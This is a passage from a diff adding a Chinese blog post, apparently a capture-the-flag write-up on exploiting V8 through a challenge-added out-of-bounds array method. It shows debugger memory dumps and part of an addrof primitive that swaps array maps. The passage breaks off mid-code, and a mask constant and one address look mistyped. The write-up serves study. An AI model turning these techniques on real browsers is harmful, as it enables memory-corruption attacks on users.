+</span></span><span style="display:flex;"><span> - map: 0x03d4082c3ae1 &lt;Map<span style="color:#f92672">(</span>PACKED_DOUBLE_ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03d40828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - elements: 0x03d40810a6e1 &lt;FixedDoubleArray<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>PACKED_DOUBLE_ELEMENTS<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - length: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span> - properties: 0x03d40800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - All own properties <span style="color:#f92672">(</span>excluding elements<span style="color:#f92672">)</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    000003D4080048F1: <span style="color:#f92672">[</span>String<span style="color:#f92672">]</span> in ReadOnlySpace: <span style="color:#75715e">#length: 0x03d40820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> - elements: 0x03d40810a6e1 &lt;FixedDoubleArray<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>           0: 1.1
+</span></span><span style="display:flex;"><span>           1: 1.2
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>000003D4082C3AE1: <span style="color:#f92672">[</span>Map<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - type: JS_ARRAY_TYPE
+</span></span><span style="display:flex;"><span> - instance size: <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span> - inobject properties: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - elements kind: PACKED_DOUBLE_ELEMENTS
+</span></span><span style="display:flex;"><span> - unused property fields: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - enum length: invalid
+</span></span><span style="display:flex;"><span> - back pointer: 0x03d4082c3ab9 &lt;Map<span style="color:#f92672">(</span>HOLEY_SMI_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - prototype_validity cell: 0x03d408202405 &lt;Cell value<span style="color:#f92672">=</span> 1&gt;
+</span></span><span style="display:flex;"><span> - instance descriptors <span style="color:#75715e">#1: 0x03d40828c38d &lt;DescriptorArray[1]&gt;</span>
+</span></span><span style="display:flex;"><span> - transitions <span style="color:#75715e">#1: 0x03d40828c3d9 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+</span></span><span style="display:flex;"><span>     0x03d408005229 &lt;Symbol: <span style="color:#f92672">(</span>elements_transition_symbol<span style="color:#f92672">)</span>&gt;: <span style="color:#f92672">(</span>transition to HOLEY_DOUBLE_ELEMENTS<span style="color:#f92672">)</span> -&gt; 0x03d4082c3b09 &lt;Map<span style="color:#f92672">(</span>HOLEY_DOUBLE_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03d40828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - constructor: 0x03d40828bc4d &lt;JSFunction Array <span style="color:#f92672">(</span>sfi <span style="color:#f92672">=</span> 000003D40820FE71<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - dependent code: 0x03d4080021b9 &lt;Other heap object <span style="color:#f92672">(</span>WEAK_FIXED_ARRAY_TYPE<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - construction counter: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1, 1.2<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>第一行 <code>DebugPrint: 000003D40810A6F9: [JSArray]</code> 是指 a 在内存中的指针是 <code>000003D40810A6F9</code>，数据类型是 <code>JSArray</code>。</p>
+<p><code>0x000003D40810A6F9</code> 作为一个对象的起始地址是有点奇怪的，一般来说内存块起始地址都是按 4 或 8 对齐的，不会出现一个对象从奇数地址开始的情况。这是因为 <code>0x000003D40810A6F9</code> 严格来说并不是 <code>a</code> 的指针，而是标记指针（Tagged pointer）。</p>
+<p>标记指针是优化后的指针，v8 是在一个很小的范围内分配的对象的内存，64 位地址的高 32 位都是一样的，为了减小指针的内存占用，v8 就只存储指针的低 32 位。而且对象的指针都是对齐过的，最低位固定为 0，可以作为标志位使用。最低位置位时代表数据类型是标记指针，清零代表存放的是 Smi。Smi 是对小整数的一种优化，把一个小整数左移一位就得到了它对应的 Smi。更多内容，参考v8的<a href="https://v8.dev/blog/pointer-compression">文档</a>。</p>
+<p>所以 <code>a</code> 真实的地址是 <code>0x000003D40810A6F8</code>，在调试器里查看存储的数据</p>
+<p><img src="/assets/images/Pasted%20image%2020220203000947.png" alt=""></p>
+<p><code>JSArray</code> 对应 CPP 中的 <code>v8::internall::JSArray</code>，阅读代码得知它有以下几个成员：</p>
+<ul>
+<li>map: 存放对象的类型信息，如：原型、属性名</li>
+<li>properties: 对象属性的指针</li>
+<li>elements: 数组元素的指针</li>
+<li>length: 数组长度 (Smi)</li>
+</ul>
+<p>再看下 elements 处的内存布局</p>
+<p><img src="/assets/images/Pasted%20image%2020220203001131.png" alt=""></p>
+<p>elements 指向的是作为缓冲区使用的 FixedArray 对象，包含：</p>
+<ul>
+<li>map</li>
+<li>length</li>
+<li>内嵌的缓冲区</li>
+</ul>
+<p>按双精度浮点数显示，就可以看到存放在数组中的 1.1, 1.2 两个浮点数。</p>
+<p><img src="/assets/images/Pasted%20image%2020220203001306.png" alt=""></p>
+<p>越界访问到的就是跟在 1.2 之后的值，也就是 <code>0x99993d49810a6f8</code> 起始的 8 字节内存。这刚好就是 <code>a</code> 的起始地址，存放的是 <code>a</code> 的 map 和 properties，测试几次发现都是这样的。这样的话越界访问就可以读、写浮点数组的 map 和 properties。</p>
+<hr>
+<p><strong>ℹ️NOTE</strong>: 深入分析的话，会发现在数组的创建过程中，这两个内存块是紧接在一起线性分配的，在数组大小选取的合适情况下，内存地址一定是相连的。</p>
+<hr>
+<h3 id="addrof">addrof</h3>
+<p>map 中存放了关于对象类型的信息，例如原型，属性等。把浮点数数组的 map 替换成对象数组的，v8 解释器就会把它当做对象数组。利用这个特性，通过如下操作就可以读到对象的指针：</p>
+<ul>
+<li>浮点数组 map 改成对象数组</li>
+<li>对象存入数组的指定位置，存入的缓冲区的数据，实际上对象的指针</li>
+<li>再把 map 恢复回去</li>
+<li>把指针当做浮点数从数组读出</li>
+</ul>
+<p>目前已经可以读、写浮点数组 map，只要再找到读取对象数组 map 的方法，addrof 就可以实现了。</p>
+<p>观察下对象数组的内存布局，看看对象数组的越界访问能读到什么：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>d8&gt; obj <span style="color:#f92672">=</span> <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>d8&gt; let arr2 <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>obj<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>undefined
+</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint<span style="color:#f92672">(</span>arr2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DebugPrint: 000003C00810B071: <span style="color:#f92672">[</span>JSArray<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - map: 0x03c0082c3b31 &lt;Map<span style="color:#f92672">(</span>PACKED_ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03c00828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - elements: 0x03c00810b065 &lt;FixedArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>PACKED_ELEMENTS<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - length: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> - properties: 0x03c00800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - All own properties <span style="color:#f92672">(</span>excluding elements<span style="color:#f92672">)</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    000003C0080048F1: <span style="color:#f92672">[</span>String<span style="color:#f92672">]</span> in ReadOnlySpace: <span style="color:#75715e">#length: 0x03c00820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> - elements: 0x03c00810b065 &lt;FixedArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>           0: 0x03c00810afad &lt;Object map <span style="color:#f92672">=</span> 000003C0082C22D1&gt;
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>000003C0082C3B31: <span style="color:#f92672">[</span>Map<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - type: JS_ARRAY_TYPE
+</span></span><span style="display:flex;"><span> - instance size: <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span> - inobject properties: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - elements kind: PACKED_ELEMENTS
+</span></span><span style="display:flex;"><span> - unused property fields: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - enum length: invalid
+</span></span><span style="display:flex;"><span> - back pointer: 0x03c0082c3b09 &lt;Map<span style="color:#f92672">(</span>HOLEY_DOUBLE_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - prototype_validity cell: 0x03c008202405 &lt;Cell value<span style="color:#f92672">=</span> 1&gt;
+</span></span><span style="display:flex;"><span> - instance descriptors <span style="color:#75715e">#1: 0x03c00828c38d &lt;DescriptorArray[1]&gt;</span>
+</span></span><span style="display:flex;"><span> - transitions <span style="color:#75715e">#1: 0x03c00828c409 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+</span></span><span style="display:flex;"><span>     0x03c008005229 &lt;Symbol: <span style="color:#f92672">(</span>elements_transition_symbol<span style="color:#f92672">)</span>&gt;: <span style="color:#f92672">(</span>transition to HOLEY_ELEMENTS<span style="color:#f92672">)</span> -&gt; 0x03c0082c3b59 &lt;Map<span style="color:#f92672">(</span>HOLEY_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03c00828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - constructor: 0x03c00828bc4d &lt;JSFunction Array <span style="color:#f92672">(</span>sfi <span style="color:#f92672">=</span> 000003C00820FE71<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - dependent code: 0x03c0080021b9 &lt;Other heap object <span style="color:#f92672">(</span>WEAK_FIXED_ARRAY_TYPE<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - construction counter: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[{}]</span>
+</span></span></code></pre></div><p>查看内存数据：</p>
+<p><img src="/assets/images/Pasted%20image%2020220213221256.png" alt=""></p>
+<p>对象数组的元素是 4 字节的标记指针，而 <code>oob</code> 函数是把数组元素当做 8 字节的浮点数处理的，这使得对象数组的 <code>oob</code> 是不能直接读取到 map 的。</p>
+<p>不过随着数组元素数量的增加，<code>oob</code> 能读到的位置是在向下移动的，最终一定会越过对象数组的所在的区域，读到高地址处其他的值。如果我们先在后面的内存中布局其它的对象数组，就有可能读到其它对象数组的 map。</p>
+<p>经过简单的计算和尝试，找到了一个合适的方案：创建相邻的两个对象数组，第一个数组有 8 个元素，第二个数组有 2 个元素。第一个数组的 <code>oob</code> 函数刚好就可以读到第二个数组的 Map 值。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>d8&gt; arr2 <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>obj, obj, obj, obj, obj, obj, obj, obj<span style="color:#f92672">]</span>;arr3<span style="color:#f92672">=[</span>obj,obj<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[{}</span>, <span style="color:#f92672">{}]</span>
+</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint<span style="color:#f92672">(</span>arr2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DebugPrint: 000003C00810B239: <span style="color:#f92672">[</span>JSArray<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - map: 0x03c0082c3b31 &lt;Map<span style="color:#f92672">(</span>PACKED_ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03c00828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - elements: 0x03c00810b211 &lt;FixedArray<span style="color:#f92672">[</span>8<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>PACKED_ELEMENTS<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - length: <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span> - properties: 0x03c00800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - All own properties <span style="color:#f92672">(</span>excluding elements<span style="color:#f92672">)</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    000003C0080048F1: <span style="color:#f92672">[</span>String<span style="color:#f92672">]</span> in ReadOnlySpace: <span style="color:#75715e">#length: 0x03c00820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> - elements: 0x03c00810b211 &lt;FixedArray<span style="color:#f92672">[</span>8<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         0-7: 0x03c00810afad &lt;Object map <span style="color:#f92672">=</span> 000003C0082C22D1&gt;
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>000003C0082C3B31: <span style="color:#f92672">[</span>Map<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - type: JS_ARRAY_TYPE
+</span></span><span style="display:flex;"><span> - instance size: <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span> - inobject properties: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - elements kind: PACKED_ELEMENTS
+</span></span><span style="display:flex;"><span> - unused property fields: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - enum length: invalid
+</span></span><span style="display:flex;"><span> - back pointer: 0x03c0082c3b09 &lt;Map<span style="color:#f92672">(</span>HOLEY_DOUBLE_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - prototype_validity cell: 0x03c008202405 &lt;Cell value<span style="color:#f92672">=</span> 1&gt;
+</span></span><span style="display:flex;"><span> - instance descriptors <span style="color:#75715e">#1: 0x03c00828c38d &lt;DescriptorArray[1]&gt;</span>
+</span></span><span style="display:flex;"><span> - transitions <span style="color:#75715e">#1: 0x03c00828c409 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+</span></span><span style="display:flex;"><span>     0x03c008005229 &lt;Symbol: <span style="color:#f92672">(</span>elements_transition_symbol<span style="color:#f92672">)</span>&gt;: <span style="color:#f92672">(</span>transition to HOLEY_ELEMENTS<span style="color:#f92672">)</span> -&gt; 0x03c0082c3b59 &lt;Map<span style="color:#f92672">(</span>HOLEY_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03c00828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - constructor: 0x03c00828bc4d &lt;JSFunction Array <span style="color:#f92672">(</span>sfi <span style="color:#f92672">=</span> 000003C00820FE71<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - dependent code: 0x03c0080021b9 &lt;Other heap object <span style="color:#f92672">(</span>WEAK_FIXED_ARRAY_TYPE<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - construction counter: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[{}</span>, <span style="color:#f92672">{}</span>, <span style="color:#f92672">{}</span>, <span style="color:#f92672">{}</span>, <span style="color:#f92672">{}</span>, <span style="color:#f92672">{}</span>, <span style="color:#f92672">{}</span>, <span style="color:#f92672">{}]</span>
+</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint<span style="color:#f92672">(</span>arr3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DebugPrint: 000003C00810B259: <span style="color:#f92672">[</span>JSArray<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - map: 0x03c0082c3b31 &lt;Map<span style="color:#f92672">(</span>PACKED_ELEMENTS<span style="color:#f92672">)</span>&gt; <span style="color:#f92672">[</span>FastProperties<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03c00828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - elements: 0x03c00810b249 &lt;FixedArray<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">[</span>PACKED_ELEMENTS<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - length: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span> - properties: 0x03c00800222d &lt;FixedArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - All own properties <span style="color:#f92672">(</span>excluding elements<span style="color:#f92672">)</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    000003C0080048F1: <span style="color:#f92672">[</span>String<span style="color:#f92672">]</span> in ReadOnlySpace: <span style="color:#75715e">#length: 0x03c00820215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span> - elements: 0x03c00810b249 &lt;FixedArray<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>&gt; <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>         0-1: 0x03c00810afad &lt;Object map <span style="color:#f92672">=</span> 000003C0082C22D1&gt;
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>000003C0082C3B31: <span style="color:#f92672">[</span>Map<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> - type: JS_ARRAY_TYPE
+</span></span><span style="display:flex;"><span> - instance size: <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span> - inobject properties: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - elements kind: PACKED_ELEMENTS
+</span></span><span style="display:flex;"><span> - unused property fields: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> - enum length: invalid
+</span></span><span style="display:flex;"><span> - back pointer: 0x03c0082c3b09 &lt;Map<span style="color:#f92672">(</span>HOLEY_DOUBLE_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - prototype_validity cell: 0x03c008202405 &lt;Cell value<span style="color:#f92672">=</span> 1&gt;
+</span></span><span style="display:flex;"><span> - instance descriptors <span style="color:#75715e">#1: 0x03c00828c38d &lt;DescriptorArray[1]&gt;</span>
+</span></span><span style="display:flex;"><span> - transitions <span style="color:#75715e">#1: 0x03c00828c409 &lt;TransitionArray[4]&gt;Transition array #1:</span>
+</span></span><span style="display:flex;"><span>     0x03c008005229 &lt;Symbol: <span style="color:#f92672">(</span>elements_transition_symbol<span style="color:#f92672">)</span>&gt;: <span style="color:#f92672">(</span>transition to HOLEY_ELEMENTS<span style="color:#f92672">)</span> -&gt; 0x03c0082c3b59 &lt;Map<span style="color:#f92672">(</span>HOLEY_ELEMENTS<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> - prototype: 0x03c00828bebd &lt;JSArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>&gt;
+</span></span><span style="display:flex;"><span> - constructor: 0x03c00828bc4d &lt;JSFunction Array <span style="color:#f92672">(</span>sfi <span style="color:#f92672">=</span> 000003C00820FE71<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - dependent code: 0x03c0080021b9 &lt;Other heap object <span style="color:#f92672">(</span>WEAK_FIXED_ARRAY_TYPE<span style="color:#f92672">)</span>&gt;
+</span></span><span style="display:flex;"><span> - construction counter: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[{}</span>, <span style="color:#f92672">{}]</span>
+</span></span></code></pre></div><p>查看内存：</p>
+<p><img src="/assets/images/Pasted%20image%2020220213224048.png" alt=""></p>
+<p>对第一个数组调用 <code>oob</code>，访问的内存为 <code>0x000003C00810B218 + 0x8 * 0x8 =&gt; 0x000003C00810B258</code>，刚好是第二个数组的 map 所在的位置。</p>
+<p>addrof 代码实现如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">f64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i64</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigInt64Array</span>(<span style="color:#a6e22e">buf</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">f</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i64</span>[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">i64</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">zero_high_word</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#e6db74">&#34;0x00000000ffffffff&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_map_double_array</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">zero_high_word</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">oob</span>()));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_map_obj_array</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr1</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr2</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">obj</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// arr1.oob will read arr2&#39;s map
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">zero_high_word</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr1</span>.<span style="color:#a6e22e">oob</span>()));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">modify_double_arr_map</span>(<span style="color:#a6e22e">arr</span>, <span style="color:#a6e22e">new_map</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">old_v</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">oob</span>());
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">new_v</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">old_v</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#e6db74">&#39;0xffffffff0000000&#39;</span>) <span style="color:#f92672">|</span> <span style="color:#a6e22e">new_map</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">new_v</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">double_array_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_map_double_array</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">obj_array_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_map_obj_array</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">double_array_map</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">obj_array_map</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {}
